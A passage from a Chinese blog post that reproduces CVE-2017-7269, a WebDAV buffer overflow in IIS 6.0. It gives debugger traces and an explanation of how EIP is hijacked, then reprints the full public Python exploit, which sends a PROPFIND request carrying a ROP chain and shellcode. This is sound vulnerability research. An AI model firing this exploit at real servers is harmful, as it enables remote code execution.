<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd ebp-328</span><br><span class="line">012bf90c  680312c0 52566c44 6c6d4b37 585a4f58</span><br><span class="line">012bf91c  496a7950 4a52584f 664d4150 680313c0</span><br><span class="line">012bf92c  65314834 6e666f43 436c7441 680313c0</span><br><span class="line">012bf93c  6a415343 33307052 424c5866 6346704b</span><br><span class="line">012bf94c  79415173 4a6c7a50 0000003e 00000000</span><br><span class="line">012bf95c  00000000 01e80608 00000108 0000fee8</span><br><span class="line">012bf96c  012bf984 5a63210d 013448c8 012bfa54</span><br><span class="line">012bf97c  01e8c078 012bf998 012bf9b0 5a5c1367</span><br></pre></td></tr></table></figure>

<p>调用<code>ScStoragePathFromUrl</code>将<code>shellcode</code>写入<code>0x680312c0</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; db 680312c0 </span><br><span class="line">680312c0  63 00 3a 00 5c 00 69 00-6e 00 65 00 74 00 70 00  c.:.\.i.n.e.t.p.</span><br><span class="line">680312d0  75 00 62 00 5c 00 77 00-77 00 77 00 72 00 6f 00  u.b.\.w.w.w.r.o.</span><br><span class="line">680312e0  6f 00 74 00 5c 00 62 00-62 00 62 00 62 00 62 00  o.t.\.b.b.b.b.b.</span><br><span class="line">680312f0  62 00 62 00 48 79 75 61-43 4f 67 6f 6f 6b 45 48  b.b.HyuaCOgookEH</span><br><span class="line">68031300  46 36 75 67 33 44 71 38-65 57 62 5a 35 54 61 56  F6ug3Dq8eWbZ5TaV</span><br><span class="line">68031310  52 69 53 6a 57 51 4e 38-48 59 55 63 71 49 64 43  RiSjWQN8HYUcqIdC</span><br><span class="line">68031320  72 64 68 34 58 47 79 71-6b 33 55 6b 48 6d 4f 50  rdh4XGyqk3UkHmOP</span><br><span class="line">68031330  46 7a 71 34 54 6f 43 74-56 59 6f 6f 41 73 57 34  Fzq4ToCtVYooAsW4</span><br></pre></td></tr></table></figure>

<p><code>HrGetLockIdForPath</code>中第一次调用<code>ScStoragePathFromUrl</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd ebp-14</span><br><span class="line">012bfbbc  012bfab4 000045a9 012bfc30 67410bdd</span><br><span class="line">012bfbcc  00000002 012bfc3c 673eaba9 01e8cb16</span><br><span class="line">012bfbdc  80000000 012bfc28 00000000 01e8f248</span><br><span class="line">012bfbec  01e8f780 01e8f780 00000000 00000000</span><br><span class="line">012bfbfc  00000000 00000040 00000000 012bfc29</span><br><span class="line">012bfc0c  00000012 01e8cf68 00000000 00000000</span><br><span class="line">012bfc1c  00000000 00000000 00000000 00000000</span><br><span class="line">012bfc2c  00000000 012bfc6c 6740fd44 00000000</span><br></pre></td></tr></table></figure>

<p>第二次调用<code>ScStoragePathFromUrl</code>，地址<code>012bfbe8</code>被填充为<code>680313c0</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd ebp-14</span><br><span class="line">012bfbbc  680312c0 52566c44 6c6d4b37 585a4f58</span><br><span class="line">012bfbcc  496a7950 4a52584f 664d4150 680313c0</span><br><span class="line">012bfbdc  65314834 6e666f43 436c7441 680313c0</span><br><span class="line">012bfbec  6a415343 33307052 424c5866 6346704b</span><br><span class="line">012bfbfc  79415173 4a6c7a50 0000003e 012bfc29</span><br><span class="line">012bfc0c  00000012 01e8cf68 00000000 00000000</span><br><span class="line">012bfc1c  00000000 00000000 00000000 00000000</span><br><span class="line">012bfc2c  00000000 012bfc6c 6740fd44 00000000</span><br></pre></td></tr></table></figure>

<p>解析 <code>URL</code> 第二部分，跳转到<code>680313c0+24</code>，最后就是<code>ROP+shellcode</code>了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; u</span><br><span class="line">httpext!ScStripAndCheckHttpPrefix+0x1e:</span><br><span class="line">674035f3 ff5024          call    dword ptr [eax+24h]</span><br><span class="line">674035f6 8bd8            mov     ebx,eax</span><br><span class="line">0:007&gt; r eax</span><br><span class="line">eax&#x3D;680313c0</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><hr>
<p>第一次<code>url aaaaaa</code>中，就已经引发了栈溢出，覆盖到了<code>String</code>指针，这个指针存放在栈里，用于后续调用存放虚拟路径，由于第一次栈溢出，覆盖到了这个变量导致第二次<code>url bbbbb</code>拷贝的时候，是向一个堆地址拷贝，在<code>HrGetLockIdForPath</code>函数中同样的方式解析<code>url aaaaaa</code>,这时覆盖了调用栈中用来保存<code>CParseLockTokenHeader</code>对象成员的指针变量，在<code>ScStoragePathFromUrl</code>中正好调用到这个对象，利用这次覆盖可以达到劫持<code>EIP</code>的效果。</p>
<h3 id="公开的EXP代码"><a href="#公开的EXP代码" class="headerlink" title="公开的EXP代码"></a>公开的EXP代码</h3><hr>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.</span></span><br><span class="line"><span class="comment">#written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China </span></span><br><span class="line"><span class="comment">#-----------Email: edwardz@foxmail.com</span></span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">sock.connect((<span class="string">'192.168.59.129'</span>,<span class="number">80</span>))  </span><br><span class="line">pay=<span class="string">'PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'</span></span><br><span class="line">pay+=<span class="string">'If: &lt;http://localhost/aaaaaaa'</span></span><br><span class="line">pay+=<span class="string">'\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'</span></span><br><span class="line">pay+=<span class="string">'&gt;'</span></span><br><span class="line">pay+=<span class="string">' (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb'</span></span><br><span class="line">pay+=<span class="string">'\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'</span></span><br><span class="line">shellcode=<span class="string">'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'</span></span><br><span class="line">pay+=shellcode</span><br><span class="line">pay+=<span class="string">'&gt;\r\n\r\n'</span></span><br><span class="line"><span class="keyword">print</span> pay</span><br><span class="line">sock.send(pay)  </span><br><span class="line">data = sock.recv(<span class="number">80960</span>)  </span><br><span class="line"><span class="keyword">print</span> data </span><br><span class="line">sock.close</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><hr>
<p><code>IIS_exploit</code><a href="https://github.com/edwardz246003/IIS_exploit" target="_blank" rel="noopener">https://github.com/edwardz246003/IIS_exploit</a></p>
<p><code>Paper</code><a href="https://paper.seebug.org/259/" target="_blank" rel="noopener">https://paper.seebug.org/259/</a></p>
<p><code>Microsoft</code><a href="https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants</a></p>
<p><code>腾讯玄武实验室</code><a href="https://xlab.tencent.com/cn/2017/04/18/nsa-iis-vulnerability-analysis/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2017/04/18/nsa-iis-vulnerability-analysis/</a></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Yeanhoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yeanhoo.gitee.io/2021/03/07/CVE-2017-7269%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">http://yeanhoo.gitee.io/2021/03/07/CVE-2017-7269%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yeanhoo.gitee.io" target="_blank">Yeanhoo's Blogs</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/yeanhoo/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><a class="post-meta__tags" href="/yeanhoo/tags/CVE-2017-7269/">CVE-2017-7269</a></div><div class="post_share"><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=yeanhoo" async="async"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/yeanhoo/2021/03/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0(DWORD%20SHOOT)/"><img class="prev-cover" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2021-3-8-3.jpg" onerror="onerror=null;src='/yeanhoo/img/friend_404.gif'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">二进制漏洞——堆溢出复现(DWORD SHOOT)</div></div></a></div><div class="next-post pull-right"><a href="/yeanhoo/2021/03/07/%E7%AE%80%E6%98%93%E5%8A%A0%E5%AF%86%E5%A3%B3/"><img class="next-cover" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2021-3-8-4.jpg" onerror="onerror=null;src='/yeanhoo/img/friend_404.gif'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">简易加密壳</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Yeanhoo</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="footer_custom_text">Yeanhoo's Blogs</div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><button id="font_plus" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" title="缩小字体"><i class="fas fa-minus"></i></button></div><div id="rightside-config-show"><button id="rightside_config" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/yeanhoo/js/utils.js"></script><script src="/yeanhoo/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="/yeanhoo/js/third-party/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
document.body.addEventListener('input', POWERMODE);
</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/yeanhoo/js/third-party/ClickShowText.js"></script><script>var endLoading = function () {
  document.body.style.overflow = 'auto';
  document.getElementById('loading-box').classList.add("loaded")
}
window.addEventListener('load',endLoading)</script></body></html>